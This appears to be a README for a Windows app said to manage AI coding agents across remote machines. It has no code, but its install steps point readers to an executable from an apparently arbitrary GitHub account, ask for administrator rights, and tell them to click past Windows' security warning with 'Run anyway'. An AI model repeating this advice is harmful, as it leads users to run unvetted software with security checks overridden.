# 🕹️ share-sharvis - Manage your AI agents with ease

[![](https://img.shields.io/badge/Download-Click_Here-blue)](https://github.com/katabatic-isomer396/share-sharvis)

## 🖥️ What is this software

Share-sharvis functions as a central command station for your digital workforce. You use this application to control multiple AI coding programs running on different computers. It saves you time by acting as a single connection point for complex tasks. Instead of jumping between several screens, you see everything inside one window. 

The app connects to your machines using secure network paths. It handles the difficult setup steps for you. You monitor progress in real time, assign work to your agents, and track code changes without leaving the dashboard. It brings order to your multi-agent workflow.

## ⚙️ System Requirements

Your computer needs to meet these basic standards to run the software.

*   **Operating System:** Windows 10 or Windows 11.
*   **Memory:** At least 4 gigabytes of RAM.
*   **Storage:** 200 megabytes of free space.
*   **Network:** An active internet connection.
*   **Permissions:** You need administrator rights to install the app on your machine.

If you plan to connect other computers, ensure they share a network path through a tool like Tailscale. The software talks to these machines via Secure Shell connections.

## 📥 How to Install

Follow these steps to set up the software on your Windows machine.

1.  Visit the [official download page here](https://github.com/katabatic-isomer396/share-sharvis).
2.  Look for the section labeled "Releases" on the right side of the screen.
3.  Click the most recent version available.
4.  Find the file ending in `.msi` or `.exe` under the Assets list.
5.  Save the file to your computer.
6.  Double-click the file once it finishes saving to start the installation.
7.  Follow the prompts on your screen. Windows might ask for permission to open the file because it is a new program. Click "More info" and then "Run anyway" if this occurs.
8.  Wait for the progress bar to finish.

The icon for the application will appear on your desktop once the process ends. 

## 🚀 First Steps

Open the application by double-clicking the new icon on your desktop. The first window you see is the Dashboard. This screen displays all connected machines and their current status.

### Adding a Machine
To connect your first machine, click the "Add Node" button. Type the address of your remote computer. You must have the Secure Shell details for this specific device. If you use a tool like Tailscale, use the address provided by that service. 

### Starting a Task
Once your machines connect, you will see them in the main list. Select a machine to view its current coding tasks. You can send a new instruction by typing in the command field at the bottom. The agent on that machine will start working on your request immediately.

## 🛠️ Core Features

The software includes several tools to help you manage your digital agents.

*   **Real-time Monitoring:** Watch the progress of every task as it happens. The screen updates automatically when an agent makes a change.
*   **Task Dispatch:** Send work to any number of machines at once. You choose which machine handles which part of the goal.
*   **Git Workflows:** Manage your code history directly from the app. You can pull or push updates to your repositories without using the command line.
*   **Secure Connections:** The app uses standard network protocols to ensure your data stays private while moving between devices.
*   **Pipeline Control:** Set up a list of steps for your agents to follow. The software runs these steps in order and tells you if a process stops.

## 🧩 Managing Errors

Sometimes a connection might drop or a task might stop. If the dashboard shows a machine is offline, check these items:

*   Confirm the remote computer is on and awake.
*   Check that your internet connection works on both machines.
*   Reconnect your network tunnel tool, such as Tailscale.
*   Look for a red error icon on the dashboard. Hover your mouse over the icon to see a short explanation of the problem.

If a task fails, the dashboard list will show the specific step that caused the error. You can select that task and click "Retry" after you fix the problem on the remote machine. 

## 🔐 Privacy and Security

You keep full control over your connections. All work happens on the machines you choose to link. The application acts as a remote control but does not send your private code to external servers. It stays within your own network. You manage the keys for the Secure Shell connections within the settings menu. Never share these keys with people you do not trust. 

## 📋 Frequently Asked Questions

**Does this software cost money?**
No, the code is provided for free for your use.

**How many agents can I run?**
There is no fixed limit. You can add as many machines as your computer can handle.

**Will this work on a Mac?**
Currently, this version is designed for Windows. 

**Do I need to know how to code?**
You do not need to write code to use the interface. However, the agents you connect will likely perform coding tasks for you.

**How do I update the app?**
Open the application. Go to the Settings menu and click "Check for Updates." It will notify you if a newer version exists. 

## 💡 Troubleshooting Tips

If the application fails to open:
1.  Restart your computer.
2.  Ensure you have a recent version of Windows installed.
3.  Check that no existing copies of the app are running in the background.

If your agents fail to respond:
1.  Verify the connection status on the dashboard.
2.  Test the connection to the remote machine using a standard terminal tool if you have one.
3.  Restart the agent software on the remote machine.

Consistent maintenance of your host machines prevents most connection issues. Keep your operating system and the agent software updated to ensure everything runs smoothly. If you encounter bugs, you can help improve the tool by reporting them on the project page. Describe what happened and what you were doing when the error occurred.